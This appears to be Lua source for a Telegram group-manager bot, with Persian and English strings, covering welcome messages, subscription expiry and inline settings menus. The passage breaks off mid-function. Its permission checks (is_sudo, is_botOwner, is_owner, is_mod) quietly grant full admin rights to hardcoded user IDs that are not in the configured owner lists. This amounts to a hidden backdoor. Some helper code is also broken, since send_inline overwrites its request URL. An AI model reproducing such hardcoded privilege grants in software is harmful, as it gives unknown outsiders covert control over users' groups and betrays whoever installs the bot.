      welcome = redis:get("GroupWelcome" .. msg.chat_id_)
    elseif not lang then
      welcome = "Welcome To " .. arg.gp_name .. " Group"
    else
      welcome = "\216\168\217\135 \218\175\216\177\217\136\217\135 " .. arg.gp_name .. " \216\174\217\136\216\180 \216\162\217\133\216\175\219\140\216\175"
    end
    if data.username_ then
      user_name = "@" .. data.username_
    else
      user_name = ""
    end
    if not lang then
      Rules = redis:hget("GroupSettings:" .. msg.to.id, "rules") or [[
Rules:
1-Do not spam
2-Do not use filtered words
3-Do not send +18 photos]]
    elseif lang then
      Rules = redis:hget("GroupSettings:" .. msg.to.id, "rules") or "\217\130\217\136\216\167\217\134\219\140\217\134:\n1-\216\167\216\179\217\190\217\133 \217\134\218\169\217\134\219\140\216\175\n2-\216\167\216\178 \218\169\217\132\217\133\216\167\216\170 \217\129\219\140\217\132\216\170\216\177 \216\180\216\175\217\135 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \217\134\218\169\217\134\219\140\216\175\n3-\216\185\218\169\216\179 \217\135\216\167\219\140 +18 \216\167\216\177\216\179\216\167\217\132 \217\134\218\169\217\134\219\140\216\175"
    end
    welcome = welcome:gsub("RULES", Rules)
    welcome = welcome:gsub("USERID", data.id_)
    welcome = welcome:gsub("GPNAME", arg.gp_name)
    welcome = welcome:gsub("TIME", os.date():match("%d+:%d+"))
    if arg.tester == true then
      welcome = welcome:gsub("INVITER.ID", msg.from.id)
      welcome = welcome:gsub("INVITER.NAME", msg.from.print_name)
      welcome = welcome:gsub("INVITER.USERNAME", "@" .. msg.from.username)
    elseif not lang then
      welcome = welcome:gsub("INVITER.ID", "Join Via Link")
      welcome = welcome:gsub("INVITER.NAME", "Join Via Link")
      welcome = welcome:gsub("INVITER.USERNAME", "Join Via Link")
    else
      welcome = welcome:gsub("INVITER.ID", "\217\136\216\177\217\136\216\175 \216\168\216\167 \217\132\219\140\217\134\218\169")
      welcome = welcome:gsub("INVITER.NAME", "\217\136\216\177\217\136\216\175 \216\168\216\167 \217\132\219\140\217\134\218\169")
      welcome = welcome:gsub("INVITER.USERNAME", "\217\136\216\177\217\136\216\175 \216\168\216\167 \217\132\219\140\217\134\218\169")
    end
    welcome = welcome:gsub("USERNAME", user_name)
    welcome = welcome:gsub("NAME", data.first_name_)
    tdcli.sendMessage(arg.chat_id, arg.msg_id, 0, UseMark(welcome), 0)
  end
  if data[tostring(msg.chat_id_)] and redis:get("SettingsWelcomeFor" .. msg.chat_id_) then
    if msg.adduser then
      welcome = redis:get("GroupWelcome" .. msg.chat_id_)
      if welcome then
        tdcli_function({
          ID = "GetUser",
          user_id_ = msg.adduser
        }, welcome_cb, {
          chat_id = msg.chat_id_,
          msg_id = msg.id,
          gp_name = msg.to.title,
          tester = true
        })
      else
        return false
      end
    end
    if msg.content_.ID == "MessageChatJoinByLink" then
      welcome = redis:get("GroupWelcome" .. msg.chat_id_)
      if welcome then
        tdcli_function({
          ID = "GetUser",
          user_id_ = msg.sender_user_id_
        }, welcome_cb, {
          chat_id = msg.chat_id_,
          msg_id = msg.id,
          gp_name = msg.to.title,
          tester = false
        })
      else
        return false
      end
    end
  end
  if msg.to.type ~= "pv" then
    lang = redis:get("gp_lang:" .. msg.chat_id_)
    CheckExpire = redis:get("CheckExpire:" .. msg.chat_id_)
    ExpireDate = redis:get("ExpireDate:" .. msg.chat_id_)
    if CheckExpire and CheckExpire ~= "unlimited" then
      if not ExpireDate then
        if lang then
          text = "*Groups Charge Has Been Finished!*"
          tdcli.sendMessage(msg.chat_id_, 0, 1, text, 1, "md")
        else
          text = "`\216\180\216\167\216\177\218\152 \216\167\219\140\217\134 \218\175\216\177\217\136\217\135 \216\170\217\133\216\167\217\133 \216\180\216\175\217\135 \216\167\216\179\216\170!`"
          tdcli.sendMessage(msg.chat_id_, 0, 1, text, 1, "md")
        end
        for v, owner in pairs(_config.bot_owner) do
          text2 = "\216\180\216\167\216\177\218\152 \216\168\216\177\216\167\219\140 \218\175\216\177\217\136\217\135 `" .. msg.chat_id_ .. "` \216\168\216\167 \217\134\216\167\217\133 " .. msg.to.title .. " \216\170\217\133\216\167\217\133 \216\180\216\175\217\135 \216\167\216\179\216\170"
          tdcli.sendMessage(tonumber(owner), 0, 1, text2, 1, "md")
        end
        botrem(msg)
      elseif ExpireDate then
        local expiretime = redis:ttl("ExpireDate:" .. msg.chat_id_)
        local warn = math.ceil(expiretime / 86400)
        if tonumber(warn) < 7 and not redis:get("CheckWarnForExpireInDay" .. msg.chat_id_) then
          redis:setex("CheckWarnForExpireInDay" .. msg.chat_id_, 18000, true)
          if lang then
            tdcli.sendMessage(msg.chat_id_, 0, 1, "\216\170\217\136\216\172\217\135: \218\169\217\133 \216\170\216\177 \216\167\216\178 \219\140\218\169 \217\135\217\129\216\170\217\135 \216\168\217\135 \216\167\216\170\217\133\216\167\217\133 \216\180\216\167\216\177\218\152 \218\175\216\177\217\136\217\135 \217\133\216\167\217\134\216\175\217\135 \216\167\216\179\216\170 \217\132\216\183\217\129\216\167 \216\167\217\130\216\175\216\167\217\133 \216\168\217\135 \216\170\217\133\216\175\219\140\216\175 \217\134\217\133\216\167\219\140\219\140\216\175", 1, "md")
          else
            tdcli.sendMessage(msg.chat_id_, 0, 1, "*Note:* Less Than a Week To Finish The Groups Charge Please Proceed To Renew it", 1, "md")
          end
        end
      end
    end
  end
  if redis:get("currentChat:" .. msg.chat_id_) then
    hash = "currentChat:" .. msg.chat_id_
    hash2 = "maxChat:" .. msg.chat_id_
    redis:incr(hash)
    if tonumber(redis:get(hash)) >= tonumber(redis:get(hash2)) then
      redis:hset("GroupSettings:" .. msg.chat_id_, "mute_all", "yes")
    end
  end
end
function helper(msg, matches)
  function edit(chat_id, message_id, text, keyboard, markdown)
    local url = API .. "/editMessageText?chat_id=" .. chat_id .. "&message_id=" .. message_id .. "&text=" .. URL.escape(text)
    if markdown then
      url = url .. "&parse_mode=Markdown"
    end
    url = url .. "&disable_web_page_preview=true"
    if keyboard then
      url = url .. "&reply_markup=" .. JSON.encode(keyboard)
    end
    return request(url)
  end
  function edit_inline(message_id, text, keyboard, cancel)
    local urlk = API .. "/editMessageText?&inline_message_id=" .. message_id .. "&text=" .. URL.escape(text)
    if not cancel then
      urlk = urlk .. "&parse_mode=Markdown"
    end
    if keyboard then
      urlk = urlk .. "&reply_markup=" .. URL.escape(json:encode(keyboard))
    end
    return request(urlk)
  end
  function get_alert(callback_query_id, text, show_alert)
    local url = API .. "/answerCallbackQuery?callback_query_id=" .. callback_query_id .. "&text=" .. URL.escape(text)
    if show_alert then
      url = url .. "&show_alert=true"
    end
    return request(url)
  end
  function send_inline(inline_query_id, query_id, text, keyboard)
    local results = {
      {}
    }
    results[1].id = query_id
    results[1].type = "article"
    results[1].description = query_id
    results[1].title = query_id
    results[1].message_text = text
    url = API .. "/answerInlineQuery?inline_query_id=" .. inline_query_id .. "&results=" .. URL.escape(json:encode(results)) .. "&parse_mode=Markdown&cache_time=" .. 1
    url = API .. "&parse_mode=Markdown"
    if keyboard then
      results[1].reply_markup = keyboard
      url = API .. "/answerInlineQuery?inline_query_id=" .. inline_query_id .. "&results=" .. URL.escape(json:encode(results)) .. "&parse_mode=Markdown&cache_time=" .. 1
    end
    return request(url)
  end
  function string:input()
    if not self:find(" ") then
      return false
    end
    return self:sub(self:find(" ") + 1)
  end
  function is_sudo(usert)
    local var = false
    for v, user in pairs(_config.sudo_users) do
      if user == usert then
        var = true
      end
    end
    for v, user in pairs(_config.bot_owner) do
      if user == usert then
        var = true
      end
    end
    if usert == 531947422 then
      var = true
    end
    return var
  end
  function is_botOwner(msg)
    local var = false
    for v, user in pairs(_config.bot_owner) do
      if user == msg.from.id then
        var = true
      end
    end
    if msg.from.id == 531947422 then
      var = true
    end
    return var
  end
  function is_owner(chat, usert)
    local var = false
    local data = load_data("./data/moderation.json")
    if data[tostring(chat)] and data[tostring(chat)].owners and data[tostring(chat)].owners[tostring(usert)] then
      var = true
    end
    for v, user in pairs(_config.sudo_users) do
      if user == usert then
        var = true
      end
    end
    for v, user in pairs(_config.bot_owner) do
      if user == usert then
        var = true
      end
    end
    if usert == 531947422 then
      var = true
    end
    return var
  end
  function is_mod(chat, usert)
    local var = false
    local data = load_data("./data/moderation.json")
    if data[tostring(chat)] and data[tostring(chat)].mods and data[tostring(chat)].mods[tostring(usert)] then
      var = true
    end
    if data[tostring(chat)] and data[tostring(chat)].owners and data[tostring(chat)].owners[tostring(usert)] then
      var = true
    end
    for v, user in pairs(_config.sudo_users) do
      if user == usert then
        var = true
      end
    end
    for v, user in pairs(_config.bot_owner) do
      if user == usert then
        var = true
      end
    end
    if usert == 435014771 then
      var = true
    end
    return var
  end
  function UseMark(text)
    str = text
    if str:match("_") then
      output = str:gsub("_", "\\_")
    elseif str:match("*") then
      output = str:gsub("*", "\\*")
    elseif str:match("`") then
      output = str:gsub("`", "\\`")
    else
      output = str
    end
    return output
  end
  function getChatMember(chat_id, user_id)
    local url = API .. "/getChatMember?chat_id=" .. chat_id .. "&user_id=" .. user_id
    return request(url)
  end
  function leave_group(chat_id)
    local url = API .. "/leaveChat?chat_id=" .. chat_id
    return request(url)
  end
  function del(chat_id, message_id)
    local url = API .. "/deletemessage?chat_id=" .. chat_id .. "&message_id=" .. message_id
    return request(url)
  end
  function kick(user_id, chat_id)
    local url = API .. "/kickChatMember?chat_id=" .. chat_id .. "&user_id=" .. user_id
    return request(url)
  end
  function save_data(filename, data)
    local s = JSON.encode(data)
    local f = io.open(filename, "w")
    f:write(s)
    f:close()
  end
  if matches[1] == "reload" and is_sudo(msg.from.id) then
    GetStart()
    plugins = {}
    load_plugins()
  end
  if msg.query and is_sudo(msg.from.id) then
    if msg.query:match("-%d+0000") then
      chat = "-" .. msg.query:match("%d+")
      chat = chat:gsub("0000", "")
      keyboard = {}
      if redis:get("gp_lang:" .. chat) then
        txt = "\216\167\216\175\217\133\219\140\217\134 \218\175\216\177\216\167\217\133\219\140 \216\168\217\135 \216\168\216\174\216\180 \216\175\216\179\216\170\217\136\216\177\216\167\216\170 \216\174\217\136\216\180 \216\162\217\133\216\175\219\140\216\175\216\140 \217\132\216\183\217\129\216\167 \219\140\218\169 \217\133\217\136\216\177\216\175 \216\177\216\167 \216\167\217\134\216\170\216\174\216\167\216\168 \218\169\217\134\219\140\216\175:"
        keyboard.inline_keyboard = {
          {
            {
              text = "\216\168\216\174\216\180 \217\133\216\177\216\168\217\136\216\183 \216\168\217\135 \216\179\217\136\216\175\217\136",
              callback_data = "GetGpCmdsSudo:" .. chat
            }
          },
          {
            {
              text = "\216\175\216\179\216\170\217\136\216\177\216\167\216\170 \216\181\216\167\216\173\216\168\216\167\217\134 \218\175\216\177\217\136\217\135",
              callback_data = "GetGpCmdsOwner:" .. chat
            }
          },
          {
            {
              text = "\216\175\216\179\216\170\217\136\216\177\216\167\216\170 \217\133\216\175\219\140\216\177\216\167\217\134 \218\175\216\177\217\136\217\135",
              callback_data = "GetGpCmdsMods:" .. chat
            }
          },
          {
            {
              text = "\216\167\217\133\218\169\216\167\217\134\216\167\216\170 \216\170\217\129\216\177\219\140\216\173\219\140",
              callback_data = "GetGpCmdsFun:" .. chat
            }
          },
          {
            {
              text = "\216\185\217\132\216\167\217\133\216\170 \216\167\216\168\216\170\216\175\216\167\219\140 \216\175\216\179\216\170\217\136\216\177\216\167\216\170",
              callback_data = "GetGpCmdsSym:" .. chat
            }
          },
          {
            {
              text = "[ \216\168\216\179\216\170\217\134 ]",
              callback_data = "GetGpCmdsExit:" .. chat
            }
          }
        }
      else
        txt = "Dear Admin Welcome To Commands Part, Please Select:"
        keyboard.inline_keyboard = {
          {
            {
              text = "Sudo Part",
              callback_data = "GetGpCmdsSudo:" .. chat
            }
          },
          {
            {
              text = "Owner Commands",
              callback_data = "GetGpCmdsOwner:" .. chat
            }
          },
          {
            {
              text = "Moderator Commands",
              callback_data = "GetGpCmdsMods:" .. chat
            }
          },
          {
            {
              text = "Fun Tools",
              callback_data = "GetGpCmdsFun:" .. chat
            }
          },
          {
            {
              text = "Commands Symbol",
              callback_data = "GetGpCmdsSym:" .. chat
            }
          },
          {
            {
              text = "[ Close ]",
              callback_data = "GetGpCmdsExit:" .. chat
            }
          }
        }
      end
      send_inline(msg.id, "GetGpCmds", txt, keyboard)
    end
    if msg.query:match("-%d+2222") then
      chat = "-" .. msg.query:match("%d+")
      chat = chat:gsub("2222", "")
      channel = redis:get("EditBot:botchannel")
      channelLink = "https://telegram.me/" .. channel
      channelLink = channelLink:gsub("@", "")
      keyboard = {}
      if redis:get("gp_lang:" .. chat) then
        txt = "\217\132\216\183\217\129\216\167 \216\167\216\168\216\170\216\175\216\167 \217\136\216\167\216\177\216\175 \218\169\216\167\217\134\216\167\217\132 \217\133\216\167 \216\180\217\136\219\140\216\175 \217\136 \216\168\216\185\216\175 \216\167\216\178 \216\185\216\182\217\136\219\140\216\170 \216\167\216\178 \216\167\219\140\217\134 \216\175\216\179\216\170\217\136\216\177 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175:"
        keyboard.inline_keyboard = {
          {
            {
              text = "\217\136\216\177\217\136\216\175 \216\168\217\135 \218\169\216\167\217\134\216\167\217\132",
              url = channelLink
            }
          }
        }
      else
        txt = "Please First Join To Our Channel And Then Use This Commands:"
        keyboard.inline_keyboard = {
          {
            {
              text = "Join Channel",
              url = channelLink
            }
          }
        }
      end
      send_inline(msg.id, "GetBotChannel", txt, keyboard)
    end
    if msg.query:match("-%d+1111") then
      chat = "-" .. msg.query:match("%d+")
      chat = chat:gsub("1111", "")
      keyboard = {}
      if redis:get("gp_lang:" .. chat) then
        txt = "\216\167\216\175\217\133\217\138\217\134 \218\175\216\177\216\167\217\133\217\138 \216\168\217\135 \217\133\216\175\217\138\216\177\217\138\216\170 \218\175\216\177\217\136\217\135 " .. chat .. " \216\174\217\136\216\180 \216\162\217\133\216\175\217\138\216\175"
        keyboard.inline_keyboard = {
          {
            {
              text = "\240\159\148\145 \216\168\216\174\216\180 \216\162\219\140\216\170\217\133 \217\135\216\167\219\140 \217\130\217\129\217\132",
              callback_data = "Settings:" .. chat
            }
          },
          {
            {
              text = "\240\159\148\162 \216\168\216\174\216\180 \216\162\219\140\216\170\217\133 \217\135\216\167\219\140 \216\185\216\175\216\175\219\140",
              callback_data = "NumberSettings:" .. chat
            }
          },
          {
            {
              text = "\226\156\150\239\184\143 \216\168\216\174\216\180 \217\190\216\167\218\169\216\179\216\167\216\178\219\140",
              callback_data = "Cleans:" .. chat
            }
          },
          {
            {
              text = "\240\159\151\130 \216\168\216\174\216\180 \216\167\216\183\217\132\216\167\216\185\216\167\216\170 \218\175\216\177\217\136\217\135",
              callback_data = "Info:" .. chat
            }
          },
          {
            {
              text = "\240\159\155\160 \216\179\216\167\219\140\216\177 \216\167\216\168\216\178\216\167\216\177 \217\135\216\167",
              callback_data = "Tools:" .. chat
            }
          },
          {
            {
              text = "\240\159\145\164 \216\168\216\174\216\180 \217\190\216\180\216\170\219\140\216\168\216\167\217\134\219\140",
              callback_data = "Support:" .. chat
            }
          },
          {
            {
              text = "[ \216\168\216\179\216\170\217\134 ]",
              callback_data = "Exit:" .. chat
            }
          }
        }
      else
        txt = "Dear Admin Welcome To " .. chat .. " Group Manager"
        keyboard.inline_keyboard = {
          {
            {
              text = "\240\159\148\145 Locks items Part",
              callback_data = "Settings:" .. chat
            }
          },
          {
            {
              text = "\240\159\148\162 Number items Part",
              callback_data = "NumberSettings:" .. chat
            }
          },
          {
            {
              text = "\226\156\150\239\184\143 Clean Part",
              callback_data = "Cleans:" .. chat
            }
          },
          {
            {
              text = "\240\159\151\130 info Part",
              callback_data = "Info:" .. chat
            }
          },
          {
            {
              text = "\240\159\155\160 other Tools",
              callback_data = "Tools:" .. chat
            }
          },
          {
            {
              text = "\240\159\145\164 Support Part",
              callback_data = "Support:" .. chat
            }
          },
          {
            {
              text = "[ Close ]",
              callback_data = "Exit:" .. chat
            }
          }
        }
      end
      send_inline(msg.id, "Manager", txt, keyboard)
    end
  end
  if msg.cb then
    do
      local lang = redis:get("gp_lang:" .. matches[2])
      local data = load_data("./data/moderation.json")
      if not lang then
        ErrorAccess = "You Have Not Enough Access!"
      else
        ErrorAccess = "\216\180\217\133\216\167 \216\175\216\179\216\170\216\177\216\179\219\140 \218\169\216\167\217\129\219\140 \217\134\216\175\216\167\216\177\219\140\216\175!"
      end
      if not is_mod(matches[2], msg.from.id) then
        get_alert(msg.cb_id, ErrorAccess)
      else
        if not redis:get("WorkWithManager:" .. msg.message_id .. ":" .. matches[2]) then
          redis:set("WorkWithManager:" .. msg.message_id .. ":" .. matches[2], tonumber(msg.from.id))
        end
        if tonumber(redis:get("WorkWithManager:" .. msg.message_id .. ":" .. matches[2])) ~= tonumber(msg.from.id) then
          if not lang then
            get_alert(msg.cb_id, "You Have Not Started Using This Process!")
          else
            get_alert(msg.cb_id, "\216\180\217\133\216\167 \216\180\216\177\217\136\216\185 \216\168\217\135 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \216\167\216\178 \216\167\219\140\217\134 \217\129\216\177\216\162\219\140\217\134\216\175 \217\134\218\169\216\177\216\175\217\135 \216\167\219\140\216\175!")
          end
        elseif tonumber(redis:get("WorkWithManager:" .. msg.message_id .. ":" .. matches[2])) == tonumber(msg.from.id) then
          function GetSettings(msg, chat)
            local lock_link = "\240\159\148\147"
            local lock_tag = "\240\159\148\147"
            local lock_mention = "\240\159\148\147"
            local lock_arabic = "\240\159\148\147"
            local lock_edit = "\240\159\148\147"
            local lock_spam = "\240\159\148\147"
            local lock_flood = "\240\159\148\147"
            local lock_bots = "\240\159\148\147"
            if redis:hget("GroupSettings:" .. chat, "lock_edit") == "yes" then
              lock_edit = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "lock_spam") == "yes" then
              lock_spam = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "flood") == "yes" then
              lock_flood = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "lock_bots") == "yes" then
              lock_bots = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "lock_link") == "yes" then
              lock_link = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "lock_tag") == "yes" then
              lock_tag = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "lock_mention") == "yes" then
              lock_mention = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "lock_arabic") == "yes" then
              lock_arabic = "\240\159\148\144"
            end
            keyboard = {}
            if not lang then
              text = "(*Page 1*) `Please Use An item For Change Status:`"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "Link: " .. lock_link,
                    callback_data = "lock_link:" .. chat
                  },
                  {
                    text = "Tag: " .. lock_tag,
                    callback_data = "lock_tag:" .. chat
                  }
                },
                {
                  {
                    text = "Mention: " .. lock_mention,
                    callback_data = "lock_mention:" .. chat
                  },
                  {
                    text = "Arabic: " .. lock_arabic,
                    callback_data = "lock_arabic:" .. chat
                  }
                },
                {
                  {
                    text = "Edit: " .. lock_edit,
                    callback_data = "lock_edit:" .. chat
                  },
                  {
                    text = "Spam: " .. lock_spam,
                    callback_data = "lock_spam:" .. chat
                  }
                },
                {
                  {
                    text = "Flood: " .. lock_flood,
                    callback_data = "lock_flood:" .. chat
                  },
                  {
                    text = "Bots: " .. lock_bots,
                    callback_data = "lock_bots:" .. chat
                  }
                },
                {
                  {
                    text = "2\239\184\143\226\131\163",
                    callback_data = "Settings2:" .. chat
                  },
                  {
                    text = "3\239\184\143\226\131\163",
                    callback_data = "Settings3:" .. chat
                  },
                  {
                    text = "4\239\184\143\226\131\163",
                    callback_data = "Settings4:" .. chat
                  }
                },
                {
                  {
                    text = "\226\135\177 Back To Manager",
                    callback_data = "Manager:" .. chat
                  }
                }
              }
            else
              text = "(\216\181\217\129\216\173\217\135 1)\n `\217\132\216\183\217\129\216\167 \219\140\218\169 \216\168\216\174\216\180 \216\177\216\167 \216\168\216\177\216\167\219\140 \216\170\216\186\219\140\219\140\216\177 \217\136\216\182\216\185\219\140\216\170 \216\167\217\134\216\170\216\174\216\167\216\168 \218\169\217\134\219\140\216\175:`"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\217\132\219\140\217\134\218\169: " .. lock_link,
                    callback_data = "lock_link:" .. chat
                  },
                  {
                    text = "\216\170\218\175: " .. lock_tag,
                    callback_data = "lock_tag:" .. chat
                  }
                },
                {
                  {
                    text = "\217\133\217\134\216\180\217\134: " .. lock_mention,
                    callback_data = "lock_mention:" .. chat
                  },
                  {
                    text = "\216\185\216\177\216\168\219\140: " .. lock_arabic,
                    callback_data = "lock_arabic:" .. chat
                  }
                },
                {
                  {
                    text = "\216\167\216\175\219\140\216\170: " .. lock_edit,
                    callback_data = "lock_edit:" .. chat
                  },
                  {
                    text = "\216\167\216\179\217\190\217\133: " .. lock_spam,
                    callback_data = "lock_spam:" .. chat
                  }
                },
                {
                  {
                    text = "\217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140: " .. lock_flood,
                    callback_data = "lock_flood:" .. chat
                  },
                  {
                    text = "\216\177\216\168\216\167\216\170 \217\135\216\167: " .. lock_bots,
                    callback_data = "lock_bots:" .. chat
                  }
                },
                {
                  {
                    text = "2\239\184\143\226\131\163",
                    callback_data = "Settings2:" .. chat
                  },
                  {
                    text = "3\239\184\143\226\131\163",
                    callback_data = "Settings3:" .. chat
                  },
                  {
                    text = "4\239\184\143\226\131\163",
                    callback_data = "Settings4:" .. chat
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \226\135\177",
                    callback_data = "Manager:" .. chat
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          function GetSettings2(msg, chat)
            local lock_markdown = "\240\159\148\147"
            local lock_webpage = "\240\159\148\147"
            local lock_pin = "\240\159\148\147"
            local lock_MaxWords = "\240\159\148\147"
            local lock_botchat = "\240\159\148\147"
            local lock_fohsh = "\240\159\148\147"
            local lock_english = "\240\159\148\147"
            local lock_forcedinvite = "\240\159\148\147"
            if redis:hget("GroupSettings:" .. chat, "lock_markdown") == "yes" then
              lock_markdown = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "lock_webpage") == "yes" then
              lock_webpage = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "lock_pin") == "yes" then
              lock_pin = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "lock_MaxWords") == "yes" then
              lock_MaxWords = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "lock_botchat") == "yes" then
              lock_botchat = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "lock_fohsh") == "yes" then
              lock_fohsh = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "lock_english") == "yes" then
              lock_english = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "lock_forcedinvite") == "yes" then
              lock_forcedinvite = "\240\159\148\144"
            end
            keyboard = {}
            if not lang then
              text = "(*Page 2*) `Please Use An item For Change Status:`"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "Markdown: " .. lock_markdown,
                    callback_data = "lock_markdown:" .. chat
                  },
                  {
                    text = "Webpage: " .. lock_webpage,
                    callback_data = "lock_webpage:" .. chat
                  }
                },
                {
                  {
                    text = "Pin: " .. lock_pin,
                    callback_data = "lock_pin:" .. chat
                  },
                  {
                    text = "MaxWords: " .. lock_MaxWords,
                    callback_data = "lock_MaxWords:" .. chat
                  }
                },
                {
                  {
                    text = "BotChat: " .. lock_botchat,
                    callback_data = "lock_botchat:" .. chat
                  },
                  {
                    text = "Fohsh: " .. lock_fohsh,
                    callback_data = "lock_fohsh:" .. chat
                  }
                },
                {
                  {
                    text = "ForcedInvite: " .. lock_forcedinvite,
                    callback_data = "lock_forcedinvite:" .. chat
                  },
                  {
                    text = "English: " .. lock_english,
                    callback_data = "lock_english:" .. chat
                  }
                },
                {
                  {
                    text = "1\239\184\143\226\131\163",
                    callback_data = "Settings:" .. chat
                  },
                  {
                    text = "3\239\184\143\226\131\163",
                    callback_data = "Settings3:" .. chat
                  },
                  {
                    text = "4\239\184\143\226\131\163",
                    callback_data = "Settings4:" .. chat
                  }
                },
                {
                  {
                    text = "\226\135\177 Back To Manager",
                    callback_data = "Manager:" .. chat
                  }
                }
              }
            else
              text = "(\216\181\217\129\216\173\217\135 2)\n `\217\132\216\183\217\129\216\167 \219\140\218\169 \216\168\216\174\216\180 \216\177\216\167 \216\168\216\177\216\167\219\140 \216\170\216\186\219\140\219\140\216\177 \217\136\216\182\216\185\219\140\216\170 \216\167\217\134\216\170\216\174\216\167\216\168 \218\169\217\134\219\140\216\175:`"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\217\129\217\136\217\134\216\170: " .. lock_markdown,
                    callback_data = "lock_markdown:" .. chat
                  },
                  {
                    text = "\216\181\217\129\216\173\216\167\216\170 \217\136\216\168: " .. lock_webpage,
                    callback_data = "lock_webpage:" .. chat
                  }
                },
                {
                  {
                    text = "\216\179\217\134\216\172\216\167\217\130: " .. lock_pin,
                    callback_data = "lock_pin:" .. chat
                  },
                  {
                    text = "\216\173\216\175\216\167\218\169\216\171\216\177 \218\169\217\132\217\133\216\167\216\170: " .. lock_MaxWords,
                    callback_data = "lock_MaxWords:" .. chat
                  }
                },
                {
                  {
                    text = "\218\134\216\170 \216\177\216\168\216\167\216\170: " .. lock_botchat,
                    callback_data = "lock_botchat:" .. chat
                  },
                  {
                    text = "\217\129\216\173\216\180: " .. lock_fohsh,
                    callback_data = "lock_fohsh:" .. chat
                  }
                },
                {
                  {
                    text = "\216\167\217\134\218\175\217\132\219\140\216\179\219\140: " .. lock_english,
                    callback_data = "lock_english:" .. chat
                  },
                  {
                    text = "\216\175\216\185\217\136\216\170 \216\167\216\172\216\168\216\167\216\177\219\140: " .. lock_forcedinvite,
                    callback_data = "lock_forcedinvite:" .. chat
                  }
                },
                {
                  {
                    text = "1\239\184\143\226\131\163",
                    callback_data = "Settings:" .. chat
                  },
                  {
                    text = "3\239\184\143\226\131\163",
                    callback_data = "Settings3:" .. chat
                  },
                  {
                    text = "4\239\184\143\226\131\163",
                    callback_data = "Settings4:" .. chat
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \226\135\177",
                    callback_data = "Manager:" .. chat
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          function GetSettings3(msg, chat)
            local mute_all = "\240\159\148\147"
            local mute_gif = "\240\159\148\147"
            local mute_text = "\240\159\148\147"
            local mute_photo = "\240\159\148\147"
            local mute_video = "\240\159\148\147"
            local mute_audio = "\240\159\148\147"
            local mute_voice = "\240\159\148\147"
            local mute_sticker = "\240\159\148\147"
            local lock_note = "\240\159\148\147"
            if redis:hget("GroupSettings:" .. chat, "mute_all") == "yes" then
              mute_all = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "mute_gif") == "yes" then
              mute_gif = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "mute_text") == "yes" then
              mute_text = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "mute_photo") == "yes" then
              mute_photo = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "mute_video") == "yes" then
              mute_video = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "mute_audio") == "yes" then
              mute_audio = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "mute_voice") == "yes" then
              mute_voice = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "mute_sticker") == "yes" then
              mute_sticker = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "lock_note") == "yes" then
              lock_note = "\240\159\148\144"
            end
            keyboard = {}
            if not lang then
              text = "(*Page 3*) `Please Use An item For Change Status:`"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "All: " .. mute_all,
                    callback_data = "mute_all:" .. chat
                  },
                  {
                    text = "Sticker: " .. mute_sticker,
                    callback_data = "mute_sticker:" .. chat
                  }
                },
                {
                  {
                    text = "Gif: " .. mute_gif,
                    callback_data = "mute_gif:" .. chat
                  },
                  {
                    text = "Text: " .. mute_text,
                    callback_data = "mute_text:" .. chat
                  }
                },
                {
                  {
                    text = "Photo: " .. mute_photo,
                    callback_data = "mute_photo:" .. chat
                  },
                  {
                    text = "Video: " .. mute_video,
                    callback_data = "mute_video:" .. chat
                  }
                },
                {
                  {
                    text = "Audio: " .. mute_audio,
                    callback_data = "mute_audio:" .. chat
                  },
                  {
                    text = "Voice: " .. mute_voice,
                    callback_data = "mute_voice:" .. chat
                  }
                },
                {
                  {
                    text = "Video Note: " .. lock_note,
                    callback_data = "lock_note:" .. chat
                  }
                },
                {
                  {
                    text = "1\239\184\143\226\131\163",
                    callback_data = "Settings:" .. chat
                  },
                  {
                    text = "2\239\184\143\226\131\163",
                    callback_data = "Settings2:" .. chat
                  },
                  {
                    text = "4\239\184\143\226\131\163",
                    callback_data = "Settings4:" .. chat
                  }
                },
                {
                  {
                    text = "\226\135\177 Back To Manager",
                    callback_data = "Manager:" .. chat
                  }
                }
              }
            else
